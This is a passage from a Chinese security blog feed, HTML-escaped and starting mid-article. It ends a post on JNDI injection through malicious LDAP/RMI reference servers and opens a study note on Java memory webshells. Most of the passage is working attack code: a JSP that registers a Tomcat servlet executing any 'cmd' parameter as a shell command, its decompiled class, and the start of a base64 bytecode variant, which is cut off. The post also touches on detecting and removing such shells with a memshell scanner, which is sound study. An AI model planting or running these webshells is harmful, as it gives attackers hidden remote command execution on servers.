&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getLocalTime&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; [LDAPSERVER] &amp;gt;&amp;gt; Reference that matches the name(&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;) is not found.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当客户端来lookup这个生成好的ldap远程地址时，会在各种lookup后收到一个Reference对象，在处理过程中会导致静态代码块的命令执行&lt;/p>
&lt;p>lookup&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;gt;DirectoryManager.getObjectInstance-&amp;gt;NamingManager.getObjectFactoryFromReference&lt;/p>
&lt;h3 id="rmirefserver">RMIRefServer&lt;/h3>
&lt;p>跟RMI的利用类似，不详说&lt;/p>
&lt;p>lookup&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;gt;RegisterContext.decodeObject-&amp;gt;NamingManager.getObjectInstance-&amp;gt;NamingManager.getObjectFactoryFromReference&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="http://tttang.com/archive/1611/">JNDI注入分析&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/317625.html">Z3专栏 | JNDI注入和工具分析&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/">浅析JNDI注入&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">浅析高低版JDK下的JNDI注入及绕过&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.mi1k7ea.com/2019/09/02/%E7%94%B1JNDI%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84Spring-Framework%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">由JNDI注入引发的Spring Framework反序列化漏洞&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Java学习笔记Ⅴ</title><link>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</link><pubDate>Mon, 30 May 2022 23:20:41 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</guid><description>&lt;p>各路博客没少看，踩的坑怎么还超级多呢……所有参考链接附在文末&lt;/p>
&lt;hr>
&lt;blockquote>
&lt;p>本文涉及到的Java环境&amp;amp;相关依赖，仅供参考：&lt;/p>
&lt;p>Java 1.8.0_311 (8u311)&lt;/p>
&lt;p>tomcat-embed-core 8.5.73, tomcat-embed-jasper 8.5.73&lt;/p>
&lt;p>commons-collections 3.2.1&lt;/p>
&lt;p>javassist 3.20.0-GA&lt;/p>
&lt;/blockquote>
&lt;h2 id="jsp文件落地">jsp&amp;amp;文件落地&lt;/h2>
&lt;p>可能很多人会觉得：都内存马了怎么还能文件落地？？？&lt;/p>
&lt;p>有一说一，确实，但逻辑不是这样讲的：应该是内存马可以做到文件不落地——也就是说删除上马时凭借的.java .jsp .class文件后一样可以运行于内存中并执行命令（除非单独kill），而上马的过程中根据使用手段的不同会产生一定程度的文件落地&lt;/p>
&lt;p>对于jsp来说，&lt;strong>一定&lt;/strong>会在初次请求时被tomcat自动生成对应的.java和.class文件并放在临时目录中，毕竟jsp本质就是一个Servlet，基于此，所有的jsp webshell都会产生文件落地（除非自删除 参见后面的三级标题）&lt;/p>
&lt;p>而jsp webshell，三梦师傅的&lt;a href="https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/">都0202年了老嗨还在用的 - 各种姿势jsp webshell&lt;/a>已经杀死了比赛，下面我们重点来看内存马&lt;/p>
&lt;h3 id="虚假的jsp">虚假的jsp&lt;/h3>
&lt;p>代码参考自&lt;a href="https://xz.aliyun.com/t/11003">JAVA内存马的“一生”&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.ApplicationContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.lang.reflect.Field&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.StandardContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.IOException&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.InputStream&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.util.Scanner&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.PrintWriter&amp;#34; %&amp;gt;
&amp;lt;%@ page language=&amp;#34;java&amp;#34; contentType=&amp;#34;text/html; charset=UTF-8&amp;#34; pageEncoding=&amp;#34;UTF-8&amp;#34;%&amp;gt;
&amp;lt;%
final String name = &amp;#34;servletshell&amp;#34;;
// 获取上下文
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
// 注册Servlet对象 并重写service方法
Servlet servlet = new Servlet() {
@Override
public void init(ServletConfig servletConfig) throws ServletException {
}
@Override
public ServletConfig getServletConfig() {
return null;
}
@Override
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
String cmd = servletRequest.getParameter(&amp;#34;cmd&amp;#34;); // get传入cmd参数
// 确定目标操作系统
boolean isLinux = true;
String osTyp = System.getProperty(&amp;#34;os.name&amp;#34;);
if (osTyp != null &amp;amp;&amp;amp; osTyp.toLowerCase().contains(&amp;#34;win&amp;#34;)) {
isLinux = false;
}
String[] cmds = isLinux ? new String[] {&amp;#34;sh&amp;#34;, &amp;#34;-c&amp;#34;, cmd} : new String[] {&amp;#34;cmd.exe&amp;#34;, &amp;#34;/c&amp;#34;, cmd}; // 确定命令执行的格式
// 处理输入&amp;amp;命令执行
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
// 回显执行结果
Scanner s = new Scanner( in ).useDelimiter(&amp;#34;\\a&amp;#34;);
String output = s.hasNext() ? s.next() : &amp;#34;&amp;#34;;
PrintWriter out = servletResponse.getWriter();
out.println(output);
out.flush();
out.close();
}
@Override
public String getServletInfo() {
return null;
}
@Override
public void destroy() {
}
};
// 创建Wrapper对象来封装前面new Servlet对象
org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
newWrapper.setName(name);
newWrapper.setLoadOnStartup(1);
newWrapper.setServlet(servlet);
newWrapper.setServletClass(servlet.getClass().getName());
// 为内存马添加路由映射
standardContext.addChild(newWrapper);
standardContext.addServletMappingDecoded(&amp;#34;/servletmemshell&amp;#34;,name);
response.getWriter().write(&amp;#34;inject success&amp;#34;);
%&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;servletshell&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>很好理解，通过注册Servlet并重写service方法来做到命令执行+回显，访问一次这个jsp就可以添加Servlet类型内存马到/servletmemshell路径下，但我们借助&lt;a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner&lt;/a>就可以发现事情没我们想的那么完美&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531001914278.png" alt="image-20220531001914278">&lt;/p>
&lt;p>把它dump下来&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Source code recreated from a .class file by IntelliJ IDEA
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// (powered by FernFlower decompiler)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">org.apache.jsp&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.InputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.PrintWriter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Scanner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.Servlet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletConfig&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">test_jsp$1&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Servlet&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">test_jsp$1&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">test_jsp&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this$0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletConfig&lt;/span> &lt;span style="color:#111">servletConfig&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">ServletConfig&lt;/span> &lt;span style="color:#75af00">getServletConfig&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">service&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletResponse&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">osTyp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;os.name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">osTyp&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">osTyp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;win&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cmds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;sh&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;/c&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">in&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmds&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">in&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">useDelimiter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\a&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PrintWriter&lt;/span> &lt;span style="color:#111">out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getServletInfo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">destroy&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以说所谓的“内存马”显露无疑，被看的干干净净&lt;/p>
&lt;p>究其原因并不复杂，这里dump下来的&lt;code>test_jsp$1.class&lt;/code>文件就是jsp马中&lt;code>Servlet servlet = new Servlet(){}&lt;/code>的部分，它实现了servletshell的主要功能；而因为Servlet直接被注册到当前上下文中了，所以当我们手动删除这个jsp和附带的所有.class文件后会发现/servletshell路径下的内存马依旧可以照常工作，memshell scanner会这样显示&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531004046566.png" alt="image-20220531004046566">&lt;/p>
&lt;p>真 · 内存马，不过只要使用memshell scanner的kill功能（从上下文中解绑Servlet）即可杀掉这个马，并且由于此前删掉了上马所用的.jsp文件，所以做到了彻底清除servletshell&lt;/p>
&lt;h3 id="字节码jsp">字节码jsp&lt;/h3>
&lt;p>可能有师傅能看出问题所在：这就离谱，你内存马都不用个字节码加载 这肯定会连着jsp文件一起被编译啊？？？&lt;/p>
&lt;p>有一说一，确实，那我们把上面的在jsp内直接new Servlet的做法换做字节码的形式&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.ApplicationContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.lang.reflect.Field&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.StandardContext&amp;#34; %&amp;gt;
&amp;lt;%@ page language=&amp;#34;java&amp;#34; contentType=&amp;#34;text/html; charset=UTF-8&amp;#34; pageEncoding=&amp;#34;UTF-8&amp;#34;%&amp;gt;
&amp;lt;%
String classCode = &amp;#34;yv66vgAAADQAkQoAHQBNCAA0CwBOAE8IAFAKAFEAUgoACQBTCABUCgAJAFUHAFYIAFcIAFgIAFkIAFoKAFsAXAoAWwBdCgBeAF8HAGAKABEAYQgAYgoAEQBjCgARAGQKABEAZQgAZgsAZwBoCgBpAGoKAGkAawoAaQBsBwBtBwBuBwBvAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MU2VydmxldFRlc3Q7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAcAEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcAVgcAOgcAcQcAYAcAcgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAEFNlcnZsZXRUZXN0LmphdmEMAB8AIAcAcwwAdAB1AQAHb3MubmFtZQcAdgwAdwB1DAB4AEkBAAN3aW4MAHkAegEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwB7DAB8AH0MAH4AfwcAgAwAgQCCAQARamF2YS91dGlsL1NjYW5uZXIMAB8AgwEAAlxhDACEAIUMAIYAhwwAiABJAQAABwCJDACKAIsHAIwMAI0AjgwAjwAgDACQACABAAtTZXJ2bGV0VGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF